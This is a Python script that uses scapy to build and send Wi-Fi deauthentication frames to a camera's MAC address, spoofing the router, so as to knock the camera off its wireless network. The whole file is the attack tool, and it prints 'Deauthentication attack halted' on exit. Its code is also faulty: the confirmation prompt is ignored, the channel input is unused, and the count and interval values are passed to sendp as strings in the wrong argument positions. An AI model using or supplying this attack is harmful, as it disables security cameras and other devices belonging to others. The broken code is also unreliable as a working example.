from scapy.all import *
import sys
import os


def main():
  router_channel = input('Enter router channel: ')
  router_mac_address = input('Enter router MAC Address: ')
  camera_mac_address = input('Enter camera MAC Address: ')
  interface = input('Enter interface: ')
  count = input('Enter number of packets: ')
  interval = input('Enter packet intervals: ')
  
  answer = input('Are you sure you want to attack '+ camera_mac_address + '?: ' )

  '''Create deauthentication packets'''

  dot11 = Dot11(addr1=camera_mac_address, addr2=router_mac_address, addr3=router_mac_address)
  frame = RadioTap()/dot11/Dot11Deauth()

  if len(camera_mac_address) != 17:
    raise Exception("Incorrect MAC address format")
  else:
    sendp(frame, interface, count, interval)


if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    print("Deauthentication attack halted.")
